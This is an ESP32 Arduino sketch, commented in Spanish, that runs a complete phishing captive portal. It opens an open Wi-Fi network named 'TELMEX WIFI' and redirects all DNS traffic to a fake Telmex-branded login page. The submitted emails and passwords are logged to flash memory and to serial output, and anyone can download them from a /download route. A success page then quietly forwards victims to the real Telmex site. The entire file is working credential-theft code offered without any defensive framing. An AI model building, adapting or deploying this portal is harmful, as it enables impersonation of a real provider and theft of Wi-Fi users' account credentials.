#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LittleFS.h>

const char* ap_ssid = "TELMEX WIFI";      // Nombre de la red
const char* ap_password = NULL;              // Red abierta (sin contraseña)

DNSServer dnsServer;
WebServer server(80);
const char* credFile = "/credenciales.txt";

// Página HTML del portal (estilo corporativo Telmex)
const char* loginPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Telmex WiFi - Acceso</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #003366 0%, #002244 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
        }
        .card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            overflow: hidden;
            animation: fadeInUp 0.5s ease-out;
        }
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .header {
            background: linear-gradient(135deg, #004d99 0%, #003366 100%);
            padding: 30px 20px;
            text-align: center;
            border-bottom: 4px solid #ff8c00;
        }
        .logo {
            max-width: 180px;
            height: auto;
            margin-bottom: 15px;
        }
        .header h1 {
            color: white;
            font-size: 24px;
            font-weight: 600;
            margin-top: 10px;
            letter-spacing: -0.5px;
        }
        .header p {
            color: #cce6ff;
            font-size: 14px;
            margin-top: 8px;
        }
        .content {
            padding: 30px 25px;
        }
        .wifi-badge {
            background: #f0f5fa;
            border-radius: 12px;
            padding: 12px;
            text-align: center;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            border: 1px solid #dce6ef;
        }
        .wifi-badge span {
            font-size: 24px;
        }
        .wifi-badge strong {
            color: #003366;
            font-size: 16px;
        }
        .info-text {
            text-align: center;
            font-size: 14px;
            color: #4a627a;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #003366;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 2px solid #e0e8f0;
            border-radius: 10px;
            background: #fefefe;
            transition: all 0.3s ease;
            outline: none;
            font-family: inherit;
        }
        .form-group input:focus {
            border-color: #ff8c00;
            box-shadow: 0 0 0 3px rgba(255,140,0,0.1);
        }
        .btn-login {
            width: 100%;
            background: linear-gradient(135deg, #ff8c00 0%, #e67600 100%);
            border: none;
            padding: 16px;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            transition: transform 0.2s, box-shadow 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255,140,0,0.3);
        }
        .btn-login:active {
            transform: translateY(0);
        }
        .links {
            margin-top: 25px;
            text-align: center;
            border-top: 1px solid #e8eef3;
            padding-top: 20px;
        }
        .links a {
            color: #004d99;
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
            display: inline-block;
            margin: 0 10px;
            transition: color 0.2s;
        }
        .links a:hover {
            color: #ff8c00;
            text-decoration: underline;
        }
        .btn-outline {
            display: inline-block;
            background: transparent;
            border: 2px solid #004d99;
            color: #004d99;
            padding: 10px 20px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 13px;
            margin-top: 15px;
            transition: all 0.2s;
        }
        .btn-outline:hover {
            background: #004d99;
            color: white;
            text-decoration: none;
        }
        .footer-note {
            text-align: center;
            font-size: 11px;
            color: #8ba0bc;
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #e8eef3;
        }
        .icon {
            display: inline-block;
            width: 20px;
            margin-right: 8px;
            vertical-align: middle;
        }
        @media (max-width: 480px) {
            .content {
                padding: 20px;
            }
            .header {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="header">
            <svg class="logo" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
                <rect width="200" height="60" fill="none"/>
                <text x="20" y="40" font-family="Arial, sans-serif" font-size="28" font-weight="bold" fill="white">TELMEX</text>
                <text x="140" y="40" font-family="Arial, sans-serif" font-size="14" fill="#ff8c00">WiFi</text>
            </svg>
            <h1>Acceso Clientes</h1>
            <p>Conectividad con la mejor velocidad</p>
        </div>
        <div class="content">
            <div class="wifi-badge">
                <span>📶</span>
                <strong>Red: TELMEX WIFI</strong>
                <span>🔒</span>
            </div>
            <div class="info-text">
                Ingresa tus credenciales de <strong>Telmex</strong> para acceder a Internet de alta velocidad
            </div>
            <form action="/login" method="POST">
                <div class="form-group">
                    <label>📧 Correo electrónico o usuario</label>
                    <input type="email" name="username" placeholder="ejemplo@telmex.com" required>
                </div>
                <div class="form-group">
                    <label>🔑 Contraseña</label>
                    <input type="password" name="password" placeholder="Ingresa tu contraseña" required>
                </div>
                <button type="submit" class="btn-login">Iniciar Sesión</button>
            </form>
            <div class="links">
                <a href="#">¿Olvidaste tu contraseña?</a>
                <a href="#">Regístrate en Telmex</a>
                <br>
                <a href="#" class="btn-outline">📱 Probar Telmex WiFi gratis</a>
            </div>
            <div class="footer-note">
                Al conectarte aceptas los <a href="#" style="color:#ff8c00;">Términos y Condiciones</a> de uso de la red Telmex
            </div>
        </div>
    </div>
</div>
</body>
</html>
)rawliteral";

// Página de éxito después de capturar credenciales
const char* successPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Conectado a Telmex</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #003366 0%, #002244 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .success-card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            animation: fadeIn 0.5s ease;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
        .checkmark {
            font-size: 70px;
            margin-bottom: 20px;
        }
        h2 {
            color: #003366;
            margin-bottom: 15px;
        }
        p {
            color: #4a627a;
            margin-bottom: 20px;
        }
        .spinner {
            display: inline-block;
            width: 30px;
            height: 30px;
            border: 3px solid #e0e8f0;
            border-top-color: #ff8c00;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
<div class="success-card">
    <div class="checkmark">✅</div>
    <h2>¡Conexión exitosa!</h2>
    <p>Serás redirigido a la página de inicio de Telmex</p>
    <div class="spinner"></div>
    <p style="margin-top: 20px; font-size: 12px;">Redirigiendo en <span id="countdown">5</span> segundos...</p>
</div>
<script>
    let seconds = 5;
    const countdownEl = document.getElementById('countdown');
    const interval = setInterval(() => {
        seconds--;
        countdownEl.textContent = seconds;
        if (seconds <= 0) {
            clearInterval(interval);
            window.location.href = 'http://www.telmex.com';
        }
    }, 1000);
</script>
</body>
</html>
)rawliteral";

// Función para servir archivos estáticos desde LittleFS
void handleStaticFile() {
  String path = server.uri();
  String contentType = "text/plain";
  if (path.endsWith(".png")) contentType = "image/png";
  else if (path.endsWith(".jpg") || path.endsWith(".jpeg")) contentType = "image/jpeg";
  else if (path.endsWith(".css")) contentType = "text/css";
  else if (path.endsWith(".html")) contentType = "text/html";
  else if (path.endsWith(".js")) contentType = "application/javascript";
  else if (path.endsWith(".svg")) contentType = "image/svg+xml";

  if (LittleFS.exists(path)) {
    File file = LittleFS.open(path, "r");
    server.streamFile(file, contentType);
    file.close();
    Serial.println("📁 Archivo servido: " + path);
  } else {
    server.send(200, "text/html", loginPage);
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n🚀 Iniciando portal cautivo Telmex...");

  if (!LittleFS.begin(true)) {
    Serial.println("❌ Error al montar LittleFS");
    return;
  }
  Serial.println("✅ LittleFS montado correctamente");

  // Listar archivos en LittleFS
  Serial.println("📂 Contenido de LittleFS:");
  File root = LittleFS.open("/");
  File file = root.openNextFile();
  while (file) {
    Serial.println("  - " + String(file.name()) + " (" + String(file.size()) + " bytes)");
    file = root.openNextFile();
  }
  root.close();

  // Configurar punto de acceso
  WiFi.softAP(ap_ssid, ap_password);
  Serial.println("📡 Red WiFi creada: " + String(ap_ssid));
  Serial.println("🌐 IP del AP: " + WiFi.softAPIP().toString());

  // Iniciar servidor DNS para redirigir todas las consultas
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Configurar rutas del servidor web
  server.on("/", HTTP_GET, []() {
    server.send(200, "text/html", loginPage);
  });

  server.on("/login", HTTP_POST, []() {
    if (server.hasArg("username") && server.hasArg("password")) {
      String username = server.arg("username");
      String password = server.arg("password");

      // Guardar credenciales en archivo
      File file = LittleFS.open(credFile, FILE_APPEND);
      if (file) {
        file.print("📅 Fecha: ");
        file.print(__DATE__);
        file.print(" ");
        file.print(__TIME__);
        file.print(" | 👤 Usuario: ");
        file.print(username);
        file.print(" | 🔑 Contraseña: ");
        file.println(password);
        file.println("----------------------------------------");
        file.close();
        Serial.println("💾 Credenciales guardadas en LittleFS");
      } else {
        Serial.println("❌ Error al guardar credenciales");
      }

      // Mostrar en consola serial
      Serial.println("🔑 Nuevas credenciales capturadas:");
      Serial.println("   Usuario: " + username);
      Serial.println("   Contraseña: " + password);

      server.send(200, "text/html", successPage);
    } else {
      server.send(400, "text/html", "<h3>⚠️ Error: Faltan datos</h3><p>Por favor, ingresa tu usuario y contraseña.</p>");
    }
  });

  // Ruta para descargar credenciales capturadas
  server.on("/download", HTTP_GET, []() {
    if (LittleFS.exists(credFile)) {
      File file = LittleFS.open(credFile, "r");
      server.streamFile(file, "text/plain");
      file.close();
      Serial.println("📥 Archivo credenciales.txt descargado");
    } else {
      server.send(404, "text/plain", "⚠️ No hay credenciales guardadas aún");
    }
  });

  server.onNotFound(handleStaticFile);

  server.begin();
  Serial.println("🌐 Servidor web iniciado. Portal activo.");
  Serial.print("📄 Descarga las credenciales en: http://");
  Serial.print(WiFi.softAPIP());
  Serial.println("/download");
  Serial.println("=========================================");
  Serial.println("✅ Sistema listo. Esperando conexiones...");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}